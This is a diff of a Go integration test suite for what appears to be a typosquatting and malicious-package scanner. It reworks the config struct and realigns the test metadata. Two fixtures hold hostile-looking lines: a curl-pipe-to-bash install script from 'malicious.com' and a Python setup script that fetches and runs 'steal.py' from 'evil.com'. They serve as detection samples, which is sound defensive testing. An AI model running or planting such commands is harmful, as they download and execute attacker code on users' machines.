@@ -69,20 +69,20 @@ func SetupIntegrationTestSuite(t *testing.T) *IntegrationTestSuite {
 
 	// Load test configuration
 	cfg := &config.Config{
-		Core: &config.CoreConfig{
+		App: config.AppConfig{
+			Name:        "typosentinel",
 			Version:     "1.0.0",
 			Environment: "test",
 			Debug:       false,
-			Verbose:     false,
 		},
-		Logging: &config.LoggingConfig{
+		Logging: config.LoggingConfig{
 			Level:  "info",
 			Format: "json",
 			Output: "stdout",
 		},
-		Performance: &config.PerformanceConfig{
-			MaxConcurrency: 10,
-			WorkerPoolSize: 5,
+		Server: config.ServerConfig{
+			Host: "localhost",
+			Port: 8080,
 		},
 		// Note: Complex analysis configurations have been simplified in the unified Config
 	}
@@ -125,9 +125,9 @@ func loadIntegrationTestPackages(t *testing.T) []TestPackageSpec {
 			ExpectedEngines: []string{"static", "ml"},
 			TestScenario:    "legitimate_popular_package",
 			Metadata: map[string]interface{}{
-				"downloads": 25000000,
-				"age":       3650,
-				"maintainers": 5,
+				"downloads":    25000000,
+				"age":          3650,
+				"maintainers":  5,
 				"dependencies": 30,
 			},
 		},
@@ -141,9 +141,9 @@ func loadIntegrationTestPackages(t *testing.T) []TestPackageSpec {
 			ExpectedEngines: []string{"static", "ml"},
 			TestScenario:    "legitimate_python_package",
 			Metadata: map[string]interface{}{
-				"downloads": 50000000,
-				"age":       4000,
-				"maintainers": 3,
+				"downloads":    50000000,
+				"age":          4000,
+				"maintainers":  3,
 				"dependencies": 5,
 			},
 		},
@@ -159,10 +159,10 @@ func loadIntegrationTestPackages(t *testing.T) []TestPackageSpec {
 			RiskFactors:     []string{"typosquatting", "low_downloads"},
 			TestScenario:    "typosquatting_attack",
 			Metadata: map[string]interface{}{
-				"downloads": 100,
-				"age":       30,
-				"maintainers": 1,
-				"dependencies": 0,
+				"downloads":       100,
+				"age":             30,
+				"maintainers":     1,
+				"dependencies":    0,
 				"install_scripts": []string{"curl -s http://malicious.com/payload.sh | bash"},
 			},
 		},
@@ -177,9 +177,9 @@ func loadIntegrationTestPackages(t *testing.T) []TestPackageSpec {
 			RiskFactors:     []string{"typosquatting", "malicious_setup"},
 			TestScenario:    "malicious_setup_script",
 			Metadata: map[string]interface{}{
-				"downloads": 50,
-				"age":       7,
-				"maintainers": 1,
+				"downloads":    50,
+				"age":          7,
+				"maintainers":  1,
 				"dependencies": 0,
 				"setup_script": "import os; os.system('curl http://evil.com/steal.py | python')",
 			},
@@ -195,11 +195,11 @@ func loadIntegrationTestPackages(t *testing.T) []TestPackageSpec {
 			ExpectedEngines: []string{"static", "ml"},
 			TestScenario:    "new_package_edge_case",
 			Metadata: map[string]interface{}{
-				"downloads": 1000,
-				"age":       14,
-				"maintainers": 2,
-				"dependencies": 10,
-				"has_tests": true,
+				"downloads":         1000,
+				"age":               14,
+				"maintainers":       2,
+				"dependencies":      10,
+				"has_tests":         true,
 				"has_documentation": true,
 			},
 		},
@@ -473,7 +473,7 @@ func TestErrorHandling(t *testing.T) {
 	}
 
 	result, err := suite.scanner.Scan(ctx, invalidPkg)
-	
+
 	// Should handle gracefully - either return error or partial results
 	if err != nil {
 		t.Logf("Expected error for invalid package: %v", err)
@@ -500,7 +500,7 @@ func TestTimeoutHandling(t *testing.T) {
 	}
 
 	_, err := suite.scanner.Scan(ctx, testPkg)
-	
+
 	// Should handle timeout gracefully
 	if err != nil && strings.Contains(err.Error(), "context deadline exceeded") {
 		t.Logf("Timeout handled correctly: %v", err)
